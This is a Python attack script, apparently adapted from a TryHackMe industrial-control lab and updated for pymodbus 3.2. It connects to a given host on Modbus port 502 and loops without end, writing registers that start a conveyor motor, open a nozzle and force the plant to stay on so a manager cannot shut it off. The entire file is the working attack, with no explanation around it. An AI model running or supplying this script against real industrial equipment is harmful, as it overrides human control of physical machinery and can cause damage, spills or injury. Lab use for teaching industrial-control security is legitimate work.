#!/usr/bin/env python3

# Modified version of the TryHackMe Modbus attack_move_fill.py file
# This version uses pymodbus 3.2 instead of 1.52

import sys
import time
from pymodbus.client import ModbusTcpClient

if len(sys.argv) != 2:
    print("Error: Incorrect arguments given")
    print("Usage: ./attack_move_fill.py ip_address")
    sys.exit()

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=502)
client.connect()

print('Force start plant')

while True:
    client.write_register(3, 1) # Start the conveyor belt motor
    client.write_register(4, 1) # Open the nozzle
    client.write_register(16, 1) # Start the plant & prevent manager from shutting it off
